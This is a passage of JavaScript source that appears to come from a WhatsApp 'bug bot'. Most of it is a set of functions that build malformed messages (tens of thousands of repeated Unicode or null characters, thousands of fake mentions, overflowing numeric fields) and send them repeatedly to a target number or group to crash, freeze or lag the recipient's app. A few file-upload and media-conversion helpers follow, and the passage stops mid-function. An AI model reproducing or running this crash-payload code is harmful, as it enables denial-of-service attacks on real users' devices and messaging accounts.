              ...Array.from(
                { length: 1995 },
                () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "pinzy@newsletter",
                newsletterName:
                  "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(10000),
                caption:
                  "⸙ʟᴜɴᴏx нοω αяє γου?¿" +
                  "ꦾ".repeat(60000) +
                  "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:
                "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
              newsletterJid: "120363424874566521@newsletter",
              serverId: 1
            }
          }
        }
      },
      { participant: { jid: target } }
    );
    await sleep(1000);
    await client.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: peler
      }
    });
}

async function PinzyLunoxAhAh(target) {
    console.log(chalk.red('𝗟𝘂𝗻𝗼𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴'));

    const { nodes, shouldIncludeDevicelentity } = await client.emit('getNodes');

    const message = {
        extendedTextMessage: {
            text: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust LUNOX" + "\0".repeat(100),
            matchedText: "https://t.me/Pinnxyz",
            description: "⸙ʟᴜɴᴏx нοω αяє γου?¿",
            title: "ꦽ".repeat(20000),
            previewType: 6,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCAwYBBQEBAAAAAAAAAAAAAAAAAAAAA//aAAwDAQACEQMQAA+q6BooLAAFIkkgAJIsAAJEsAAJYACWC//9oACAEBAAEFAu7Z25Z9LiY3XbLs+d2s3R8/tYm7m0y7bLlyz25dV1ZYsuXKXLly9y5cuXL3Lly5cuXL3Lly5cuXL3Lly5f/EABYRAAMAAAAAAAAAAAAAAAAAAAEQYf/aAAgBAgEBPwFQz//EABYRAAMAAAAAAAAAAAAAAAAAAAEQUf/aAAgBAwEBPwEUz//Z",
            paymentLinkMetadata: {
                button: { displayText: "LunoxPrime - Bugs" },
                header: { headerType: 1 },
                provider: { paramsJson: "{".repeat(10000) }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                ],
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "pinzy@newsletter",
                        newsletterName: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(10000),
                        caption: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                        inviteExpiration: "999999999"
                    }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                    newsletterJid: "120363424874566521@newsletter",
                    serverId: 1
                }
            }
        }
    };

    const fullMsgNode = await client.generateWAMessage(target, message, {
        userJid: client.user.id
    });

    const encNode = fullMsgNode.content[0];

    const Stanza = {
    tag: "message",
    id: client.generateMessageID(),
    type: "text",
    to: target,
    additionalAttributes: {},
    content: [
      {
        tag: "enc",
        attrs: {
          v: "2",
          type: "none"
        },
        content: []
      },
      {
        tag: "participants",
        atts: {},
        content: nodes
      }
    ]
  }

    await client.sendNode(Stanza);

    await sleep(1000);

    await client.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: fullMsgNode.attrs.id,
            participant: target
        }
    });

    console.log(chalk.bold.red("Delay Visib Success To " + target));
}

async function PinzyDelayAngeXnxx(client, target, mention) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: " ¡!LunoxPrime!¡ ", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "galaxy_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "999999"),
    }
  );

  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];

  let sequentialIndex = 0;
  console.log(chalk.red(`𝗟𝘂𝗻𝗼𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴 ${target}`));

  const selectedMedia = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia;

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from(
        { length: 300 },
        () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
      ),
    ],
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  };

  const msgxayy = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  };

  let interxnxx = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "馃└",
      contentText: "饾檮饾櫍饾檻饾櫈饾櫒 饾檴饾櫓饾櫀饾櫗",
      footerText: "InvisibleHard嗉?",
      buttons: [
        {
          buttonId: ".bugs",
          buttonText: {
            displayText: "\u0000".repeat(800000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  const statusMessages = [stickerMsg, msgxay, msgxayy];

  const content = {
    extendedTextMessage: {
      text: "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "軎?".repeat(30000),
      matchedText: "軎?".repeat(20000),
      description: "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴",
      title: "軎?".repeat(20000),
      previewType: "NONE",
      jpegThumbnail:
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      inviteLinkGroupTypeV2: "DEFAULT",
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        participant: target,
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 300 },
            () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          ),
        ],
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "pinzy@newsletter",
            newsletterName:
              "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "軎?".repeat(10000),
            caption:
              "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" +
              "軎?".repeat(60000) +
              "釤勧煗".repeat(60000),
            inviteExpiration: "999999999",
          },
        },
        forwardedNewsletterMessageInfo: {
          newsletterName:
            "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "鈨濌櫚隀瓣櫚".repeat(10000),
          newsletterJid: "120363424874566521@newsletter",
          serverId: 1,
        },
      },
    },
  };

  const xnxxmsg = generateWAMessageFromContent(target, content, {});

  for (let i = 0; i < 100; i++) {
    await client.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
            },
          ],
        },
      ],
    });

    await client.relayMessage("status@broadcast", interxnxx.message, {
      messageId: interxnxx.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    await client.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
            },
          ],
        },
      ],
    });

    for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {});
      await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      });
    }

    if (i < 99) {
      await new Promise((resolve) => setTimeout(resolve, 4000));
    }
  }

  if (mention) {
    await client.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: xnxxmsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function LunoxRowrr(target) {
const msg = {
listMessage: {
title: "\u0000",
description: "\u0000",
buttonText: "\u0000",
footerText: "\u0000",
listType: 1,
sections: [
{
title: "\u0000",
rows: [
{
title: "\u0000".repeat(90000),
description: "ꦽ".repeat(90000),
rowId: "Lunox"
},
{
title: "\x10".repeat(90000),
description: "\u0000".repeat(90000),
rowId: "pay"
},
{
title: "\u0000".repeat(90000),
description: "ြ".repeat(90000),
rowId: "loc"
},
{
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "xix"
}, 
{
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "nah"
},
 {
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000),
rowId: "x"
},
{
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "ix"
},
 {
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "nu"
},
{
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "hah"
},
 {
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "hih"
},
{
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "LunoxPrime"
},
 {
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "hoh"
}, 
{
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "nigga"
}, 
{
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "Pinzy"
},
 {
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "Lunox"
},
 {
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "qwerty"
},
 {
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "tq"
},
 {
title: "\u0000".repeat(90000), 
description: "\x10".repeat(90000), 
rowId: "bosq"
}, 
{
title: "LunoxAttack",
description: "\u0000".repeat(90000),
rowId: "who"
}
]
}
]
}
}
await client.relayMessage(target, msg, {
participant: target, 
messageId: msg.key.id
})
}

async function chatFrezzeLunox(target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await client.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{})
}

let xx = {
  "url": "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
  "mimetype": "image/jpeg",
  "fileSha256": "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
  "fileLength": "164089",
  "height": 9999,
  "width": 9999,
  "mediaKey": "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
  "fileEncSha256": "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
  "directPath": "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0"
}

for (let s = 0; s < 5; s++) {
const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "deviceListMetadata": {},
        "deviceListMetadataVersion": 2,
        "supportPayload": JSON.stringify({
            "version": 2,
            "is_ai_message": true,
            "should_show_system_message": true,
            "ticket_id": crypto.randomBytes(16)
          }),
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{ participant: { jid: target }})

const xz = await client.relayMessage(target, xy.message, {messageId:xy.key.id})

xx.caption = "ꦾ".repeat(100000);

  client.relayMessage(target, {
    protocolMessage: {
      type: "MESSAGE_EDIT",
      key: {
        fromMe: true,
        remoteJid: target,
        id: xz
      },
      editedMessage: {
        imageMessage: xx
      }
    }
  }, { participant: { jid: target }})
await sleep(100)
}
}

async function LunoxPrikitiw(target) {

  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "\0"
            },
            footer: {
              text: "\0"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "DOCUMENT",
                    flow_cta: "ꦽ".repeat(90000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: JSON.stringify({
                    transaction_id: "AXD-" + Date.now() + "ꦽ".repeat(90000)
                  })
                },
                {
                  name: "send_location",
                  buttonParamsJson: JSON.stringify({
                    location_name: "ꦽ".repeat(70000),
                    latitude: 1e308,
                    longitude: 1e308
                  })
                }
              ],
              messageParamsJson: "wa.me/stickerpack/whatsapp",
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  )

  await client.relayMessage(
    target,
    msg.message,
    {
      messageId: msg.key.id
    }
  )
}

async function pukiMax(target) {
  try {
    const pukiMax = {
      interactiveResponseMessage: {
        body: {
          text: "i'm back baby, LunoxAttack",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
          version: 3
        },
        nativeFlowResponseMessageV2: {
          name: "address_message",
          paramsJson: `{"values":{"in_pin_code":"999999","building_name":"VnX","landmark_area":"18","address":"P0K3","tower_number":"P0k3","city":"tobrut","name":"p0k3","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X${"\u0000".repeat(900000)}"}}`,
          version: 3
        },
        nativeFlowResponseMessageV3: {
          name: "menu_options",
          paramsJson: `{"display_text":"${"\u0000".repeat(900000)}","description":"${"\u0000".repeat(90000)}","id":"crash"}`,
          version: 3
        },
        contextInfo: {
          ephemeralExpiration: 0,
          forwardingScore: 99999999,
          isForwarded: true,
          font: Math.floor(Math.random() * 99999999),
          background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
          mentionedJid: Array.from({ length: 3000 }, () =>
            Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
          )
        }
      }
    };

    await client.relayMessage(target, pukiMax, {
      participant: { jid: target }
    });

    console.log(`- Success Sending Bugs to ${target}`);

  } catch (err) {
    console.error(`- Error Sending Bugs : ${err.message}`);
  }
}

async function blankjembotlunox(target, Ptcp = true) {
    await client.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "9999999999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "×‌×ʟᴜɴᴏx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "⏳ Lunox Imcoming" ,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });    
}
//FUNCTION BUG GROUP
async function crashgrouplunox(target) {
  try {
    let msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            extendedTextMessage: {
              text: "𝙇𝙪𝙣𝙤𝙭 𝘼𝙩𝙩𝙖𝙘𝙠 𝙔𝙤𝙪 ☠️" + "ꦽ".repeat(50000),
              contextInfo: {
                quotedMessage: {
                  groupInviteMessage: {
                    groupJid: "77732037327362@g.us",
                    inviteCode: "ꦽ".repeat(10000),
                    inviteExpiration: 999e+999 * Date.now(),
                    groupName: "#YT : 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥" + "ꦽ".repeat(50000),
                    caption: "#𝑳𝒖𝒏𝒐𝒙 𝑩𝒖𝒈𝒔" + "ꦽ".repeat(50000),
                    jpegThumbnail: "https://files.catbox.moe/lck4pw.jpg"
                  }
                }
              }
            }
          }
        }
      },
      {}
    );
    
    await client.sendMessage(
      target,
      {
        text: "need ff opm dana 500k tawarin ke pm"
      }
    );
    await client.groupLeave(target);
    
    await client.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });
  } catch (err) {
    console.error(err);
  }
}

async function gsIntjavgb(target, otaxkiw = true) {
  for (let i = 0; i < 20; i++) {

    let otaxi = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363424874566521@newsletter",
            newsletterName: "do u know me? | Information",
            serverMessageId: 1000,
            accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
          },
          statusAttributionType: "RESHARED_FROM_MENTION",
          contactVcard: true,
          isSampled: true,
          dissapearingMode: {
            initiator: target,
            initiatedByMe: true
          },
          expiration: Date.now()
        },
        body: {
          text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝗟𝗨𝗡𝗢𝗫",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\x10".repeat(1000000),
          version: 3
        }
      }
    }

    let msg = generateWAMessageFromContent(
      target,
      { groupStatusMessageV2: { message: otaxi } },
      {}
    )

    await client.relayMessage(
      target,
      msg.message,
      otaxkiw
        ? { messageId: msg.key.id, userJid: target }
        : { messageId: msg.key.id }
    )

    await sleep(1000)

    await client.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
      }
    })
  }
}

async function fuckgroupXnxx(target) {
    const messageContent = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "¿? 𝙄𝙢 𝙃𝙚𝙧𝙚 𝗟𝗨𝗡𝗢𝗫 🗡️🩸",
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000),
              text: "ꦽ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣",
              buttons: [
                { name: "single_select", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_method", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "call_permission_request", buttonParamsJson:"\u0003".repeat(5000), voice_call: "call_galaxy" },
                { name: "form_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "wa_payment_learn_more", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "wa_payment_transaction_details", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "wa_payment_fbpin_reset", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "catalog_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_info", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "review_order", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "send_location", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payments_care_csat", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "view_product", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_settings", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "address_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "automated_greeting_message_view_catalog", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "open_webview", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "message_with_link_status", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_status", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "galaxy_costum", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "extensions_message_v2", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "landline_call", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "mpm", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_copy", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_url", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "review_and_pay", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "galaxy_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_call", buttonParamsJson:  "\u0003".repeat(5000) }
              ]
            }
          }
        }
      }
    }, {});

    await client.relayMessage(target, messageContent.message, {
      messageId: messageContent.key.id,
      participant : { jid: target},
    });

    console.log(chalk.red(`Dah Sukses Bosku`));
  }
//BATAS FUNCTION
//PEMANGILAN FUNCTION
async function forcloselunox(target) {
  for (let i = 0; i < 60; i++) {
    await LunoxCallCrash(target, false);
    await sleep(800);
    await LunoxForceDelete(target);
    await sleep(800);
    await forcloselunoxwel(target);
  }
}

async function blankhardlunox(target) {
  for (let i = 0; i < 30; i++) {
    await LunoxBlank(target);
    await sleep(500);
    await PinzyLunoxUI(target);
    await sleep(500);
    await PinzyLunoxAhAh(target);
    await sleep(500);
    await LunoxRowrr(target);
    await sleep(500);
    await chatFrezzeLunox(target);
    await sleep(500);
    await blankjembotlunox(target, true);
  }
}

async function delayhardlunox(target) {
  for (let i = 0; i < 50; i++) {
    await PinzyDelayAngeXnxx(target);
    await sleep(500);
    await ProductionLunox(target);
    await sleep(500);
    await LunoxInvis(target);
    await sleep(500);
    await DelayLunox(target);
    await sleep(500);
    await pukiMax(target);
    await sleep(500);
    await LunoxDelayX(target, true);
    await sleep(500);
    await LunoxXdelay2(target, true);  
  }
}

async function groubattackxnxx(target) {
  for (let i = 0; i < 80; i++) {
    await crashgrouplunox(target);
    await sleep(1000);
    await fuckgroupXnxx(target);
    await sleep(1000);
    await gsIntjavgb(target, true);
  }
}
//BATAS PEMANGILAN
let formData = require('form-data')
let { fromBuffer } = require('file-type')

async function TelegraPh (buffer) {
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new formData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");

  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });

  let data = await res.text();
  return data;
}

async function UploadFileUgu (input) {
	return new Promise (async (resolve, reject) => {
			const form = new formData();
			form.append("files[]", fs.createReadStream(input))
			await axios({
				url: "https://uguu.se/upload.php",
				method: "POST",
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
					...form.getHeaders()
				},
				data: form
			}).then((data) => {
				resolve(data.data.files[0])
			}).catch((err) => reject(err))
	})
}

function webp2mp4File(path) {
	return new Promise((resolve, reject) => {
		 const form = new formData()
		 form.append('new-image-url', '')
		 form.append('new-image', fs.createReadStream(path))
		 axios({
			  method: 'post',
			  url: 'https://s6.ezgif.com/webp-to-mp4',
			  data: form,
			  headers: {
				   'Content-Type': `multipart/form-data; boundary=${form._boundary}`
			  }
		 }).then(({ data }) => {
			  const formDataThen = new formData()
			  const $ = cheerio.load(data)
			  const file = $('input[name="file"]').attr('value')
			  formDataThen.append('file', file)
			  formDataThen.append('convert', "Convert WebP to MP4!")
			  axios({
				   method: 'post',
				   url: 'https://ezgif.com/webp-to-mp4/' + file,
				   data: formDataThen,
				   headers: {
						'Content-Type': `multipart/form-data; boundary=${formDataThen._boundary}`
				   }
			  }).then(({ data }) => {
				   const $ = cheerio.load(data)
